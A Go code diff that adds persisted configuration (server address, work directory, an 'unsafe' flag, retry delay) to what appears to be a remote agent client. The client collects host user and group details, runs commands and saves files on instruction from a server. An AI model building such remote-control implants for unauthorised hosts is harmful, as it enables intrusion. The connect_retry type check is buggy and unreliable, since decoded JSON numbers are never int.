@@ -35,33 +35,121 @@ type System struct {
 	ExtIP         string `json:"ip_external"`
 	User          string `json:"user"`
 	Groups        string `json:"groups"`
-	tempDir       string `json:"-"`
+	workDir       string `json:"-"`
+	unsafe        bool   `json:"-"`
+	Server        string `json:"server"`
+	connectRetry  int    `json:"-"`
 }
 
-func InitSystem() *System {
+func InitSystem(configReset bool, server string, workDir string, unsafe bool, retryDelay int) *System {
 	sys := &System{
 		ClientVersion: VERSION,
 		UUID:          "",
 		OS:            runtime.GOOS,
 		Groups:        "",
-		tempDir:       "./",
+		workDir:       workDir,
+		Server:        server,
+		unsafe:        unsafe,
+		connectRetry:  retryDelay,
 	}
 
-	if err := sys.load(); err != nil {
-		sys.GetOSVersion()
-		sys.GetUser()
-		sys.GetUserGroups()
+	if configReset {
+		sys.saveConfig()
+	} else {
+		if err := sys.loadConfig(); err != nil {
+			if err := sys.saveConfig(); err != nil {
+				Debug(err.Error())
+			}
+		}
 	}
+
+	sys.GetOSVersion()
+	sys.GetUser()
+	sys.GetUserGroups()
 
 	return sys
 }
 
-func (sys *System) save() error {
+func (sys *System) saveConfig() error {
+	config := map[string]interface{}{
+		"uuid":          sys.UUID,
+		"work_dir":      sys.workDir,
+		"unsafe":        sys.unsafe,
+		"server":        sys.Server,
+		"connect_retry": sys.connectRetry,
+	}
+
+	file, err := os.OpenFile(sys.workDir+"tff.config", os.O_CREATE|os.O_RDWR, os.ModePerm)
+	if err != nil {
+		return err
+	}
+
+	defer file.Close()
+
+	encoder := json.NewEncoder(file)
+	if err := encoder.Encode(config); err != nil {
+		return err
+	}
+
 	return nil
 }
 
-func (sys *System) load() error {
-	return errors.New("No saved config found.")
+func (sys *System) loadConfig() error {
+	file, err := os.Open(sys.workDir + "tff.config")
+	if err != nil {
+		return err
+	}
+
+	defer file.Close()
+
+	config := map[string]interface{}{}
+	jdata, err := ioutil.ReadAll(file)
+
+	if err := json.Unmarshal(jdata, &config); err != nil {
+		return err
+	}
+
+	if v, k := config["uuid"]; k && v != "" && sys.UUID != v {
+		if vt, ok := v.(string); ok {
+			sys.UUID = vt
+		} else {
+			return errors.New("Config param uuid unreadable.")
+		}
+	}
+
+	if v, k := config["work_dir"]; k && v != "" && sys.workDir != v {
+		if vt, ok := v.(string); ok {
+			sys.workDir = vt
+		} else {
+			return errors.New("Config param work_dir unreadable.")
+		}
+	}
+
+	if v, k := config["unsafe"]; k && v != "" && sys.unsafe != v {
+		if vt, ok := v.(bool); ok {
+			sys.unsafe = vt
+		} else {
+			return errors.New("Config param unsafe unreadable.")
+		}
+	}
+
+	if v, k := config["server"]; k && v != "" && sys.Server != v {
+		if vt, ok := v.(string); ok {
+			sys.Server = vt
+		} else {
+			return errors.New("Config param server unreadable.")
+		}
+	}
+
+	if v, k := config["connect_retry"]; k && v != "" && sys.connectRetry != v {
+		if vt, ok := v.(int); ok {
+			sys.connectRetry = vt
+		} else {
+			return errors.New("Config param connect_retry unreadable.")
+		}
+	}
+
+	return nil
 }
 
 func (sys *System) toJSON() []byte {
@@ -201,7 +289,7 @@ func (sys *System) RunCommand(message *shared.Message) (string, error) {
 
 func (sys *System) SaveFile(msg *shared.Message) (string, error) {
 	// Did they request a filepath?
-	path := sys.tempDir
+	path := sys.workDir
 	if v, err := msg.GetMeta("filepath"); err == nil {
 		path = v
 	}
@@ -210,7 +298,7 @@ func (sys *System) SaveFile(msg *shared.Message) (string, error) {
 	if strings.HasSuffix(path, "/") {
 		path = path + shortuuid.New()
 	} else if strings.HasPrefix(path, "/") {
-		path = sys.tempDir + path
+		path = sys.workDir + path
 	}
 
 	if _, err := os.Stat(filepath.Dir(path)); err != nil {
